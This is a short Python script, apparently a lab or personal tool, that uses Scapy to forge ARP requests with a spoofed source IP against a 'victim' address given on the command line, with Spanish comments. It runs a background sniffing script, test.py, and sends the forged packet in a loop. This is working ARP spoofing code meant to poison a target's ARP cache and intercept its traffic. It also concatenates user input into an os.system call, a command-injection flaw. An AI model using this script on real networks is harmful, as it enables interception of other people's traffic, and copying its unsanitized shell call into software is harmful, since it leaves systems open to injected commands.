## Import Scapy module
from scapy.all import *
from os import sys

ip = sys.argv[1]
packet = Ether()/ARP()
packet.op = 1 #request
packet.psrc="10.12.166.77" #IP DEL HOST
packet.hwdst="ff:ff:ff:ff:ff:ff" # all victims
packet.pdst = ip # IP DE LA VICTIMA
packet.dst = "ff:ff:ff:ff:ff:ff" # all victims

#packet.show()
print("sniffing")
os.system('python test.py ' + ip + ' &')
print("sending")
sendp(packet, loop =1, inter = .2, count = 1)
print("done")
